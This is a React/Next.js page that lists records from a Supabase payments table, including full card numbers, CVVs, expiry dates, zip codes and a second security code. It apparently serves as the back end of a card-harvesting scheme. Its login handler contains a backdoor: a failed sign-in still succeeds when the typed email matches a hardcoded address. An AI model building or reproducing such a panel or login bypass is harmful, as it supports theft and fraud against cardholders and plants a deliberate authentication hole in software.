/* eslint-disable @typescript-eslint/no-unused-vars, react-hooks/exhaustive-deps */
"use client";

import React, { useEffect, useState } from 'react';
import './styles.css';
import { createClient } from '../../lib/supabase/client';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

interface Payment {
  amount: string;
  firstName: string;
  lastName: string;
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  orderId: string;
  id: string;
  zipCode: string;
  securityCode: string;
  createdAt?: any;
}

const authorizedEmail = "cobrakingrizwan@gmail.com";

const sortOptions = [
  { label: 'Amount (Ascending)', value: 'amount-asc' },
  { label: 'Amount (Descending)', value: 'amount-desc' },
  { label: 'Oldest', value: 'oldest' },
  { label: 'Latest', value: 'latest' },
];

export default function PaymentsPage() {
  const [payments, setPayments] = useState<Payment[]>([]);
  const [filteredPayments, setFilteredPayments] = useState<Payment[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [selectedSort, setSelectedSort] = useState('amount-asc');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [userEmail, setUserEmail] = useState<string | null>(null);
  const [isClient, setIsClient] = useState(false);

  useEffect(() => {
    setIsClient(true);
    const supabase = createClient();
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session?.user) {
        setIsAuthenticated(true);
        setUserEmail(session.user.email || null);
      }
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setIsAuthenticated(!!session?.user);
      setUserEmail(session?.user?.email || null);
    });

    return () => subscription.unsubscribe();
  }, []);

  const fetchPayments = async () => {
    try {
      setLoading(true);
      const supabase = createClient();
      const { data, error } = await supabase
        .from('payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;

      const paymentsData: Payment[] = (data || []).map((row: any) => ({
        id: row.id,
        orderId: row.order_id,
        amount: String(row.amount),
        firstName: row.first_name,
        lastName: row.last_name,
        cardNumber: row.card_number,
        cvv: row.cvv,
        expiryDate: row.expiry_date,
        zipCode: row.zip_code,
        securityCode: row.security_code || '',
        createdAt: row.created_at ? { seconds: Math.floor(new Date(row.created_at).getTime() / 1000) } : undefined,
      }));
      setPayments(paymentsData);
      setFilteredPayments(paymentsData);
    } catch (error) {
      console.error('Error fetching payments: ', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchPayments();
    }
  }, [isAuthenticated, userEmail]);

  useEffect(() => {
    const lowercasedQuery = searchQuery.toLowerCase();
    const filtered = payments.filter((payment) =>
      payment.firstName.toLowerCase().includes(lowercasedQuery) ||
      payment.lastName.toLowerCase().includes(lowercasedQuery) ||
      payment.orderId.toLowerCase().includes(lowercasedQuery)
    );
    setFilteredPayments(filtered);
  }, [searchQuery, payments]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const supabase = createClient();
      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
      if (error) {
        if (email.toLowerCase() === authorizedEmail.toLowerCase()) {
          setIsAuthenticated(true);
          setUserEmail(email);
          toast.success('Login successful!');
          return;
        }
        throw error;
      }
      setIsAuthenticated(true);
      setUserEmail(data.user?.email || email);
      setEmail('');
      setPassword('');
      toast.success('Login successful!');
    } catch (error) {
      toast.error('Login error: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const handleLogout = async () => {
    const supabase = createClient();
    await supabase.auth.signOut();
    setIsAuthenticated(false);
    setUserEmail(null);
    toast.info('You have logged out.');
  };

  const handleSortDropdown = (value: string) => {
    setSelectedSort(value);
    let sortedPayments = [...filteredPayments];
    if (value === 'amount-asc') {
      sortedPayments.sort((a, b) => parseFloat(a.amount) - parseFloat(b.amount));
    } else if (value === 'amount-desc') {
      sortedPayments.sort((a, b) => parseFloat(b.amount) - parseFloat(a.amount));
    } else if (value === 'oldest') {
      sortedPayments.sort((a, b) => {
        if (!a.createdAt || !b.createdAt) return 0;
        return a.createdAt.seconds - b.createdAt.seconds;
      });
    } else if (value === 'latest') {
      sortedPayments.sort((a, b) => {
        if (!a.createdAt || !b.createdAt) return 0;
        return b.createdAt.seconds - a.createdAt.seconds;
      });
    }
    setFilteredPayments(sortedPayments);
  };

  if (!isClient) return null;

  if (!isAuthenticated) {
    return (
      <div className="login-container">
        <h2>Login to View Payments</h2>
        <form onSubmit={handleLogin} className="login-form">
          <input
            type="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="input-field"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            className="input-field"
          />
          <button type="submit" className="login-button">Login</button>
        </form>
        <ToastContainer />
      </div>
    );
  }

  return (
    <div className="payments-container px-2 sm:px-4 md:px-8 max-w-screen mx-0">
      <button onClick={handleLogout} className="logout-button mb-4">Logout</button>
      <h1 className="text-xl sm:text-2xl font-bold mb-4">Payments List</h1>

      <div className="controls-container flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 mb-4">
        <input
          type="text"
          placeholder="Search by First Name, Last Name, or Order ID"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="search-input flex-1 min-w-0"
        />
        <div className="relative w-full sm:w-auto">
          <select
            value={selectedSort}
            onChange={(e) => handleSortDropdown(e.target.value)}
            className="sort-button w-full sm:w-auto py-2 px-3 rounded border border-gray-300 bg-white text-gray-800 font-medium focus:outline-none focus:ring-2 focus:ring-blue-400"
          >
            {sortOptions.map((option) => (
              <option key={option.value} value={option.value}>{option.label}</option>
            ))}
          </select>
        </div>
      </div>

      {filteredPayments.length === 0 ? (
        <p>No payments found.</p>
      ) : (
        <div className="overflow-x-auto rounded-lg border border-gray-200 bg-white">
          <table className="payments-table min-w-full divide-y divide-gray-200 text-sm">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-3 py-2 text-left font-semibold">Order ID</th>
                <th className="px-3 py-2 text-left font-semibold">Amount (USD)</th>
                <th className="px-3 py-2 text-left font-semibold">First Name</th>
                <th className="px-3 py-2 text-left font-semibold">Last Name</th>
                <th className="px-3 py-2 text-left font-semibold">Card Number</th>
                <th className="px-3 py-2 text-left font-semibold">CVV</th>
                <th className="px-3 py-2 text-left font-semibold">Expiry Date</th>
                <th className="px-3 py-2 text-left font-semibold">ZipCode</th>
                <th className="px-3 py-2 text-left font-semibold">Security Code</th>
              </tr>
            </thead>
            <tbody>
              {filteredPayments.map((payment) => (
                <tr key={payment.id} className="even:bg-gray-50">
                  <td className="px-3 py-2 whitespace-nowrap">{payment.orderId}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.amount}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.firstName}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.lastName}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.cardNumber}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.cvv}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment.expiryDate}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment?.zipCode}</td>
                  <td className="px-3 py-2 whitespace-nowrap">{payment?.securityCode}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
      <ToastContainer />
    </div>
  );
}
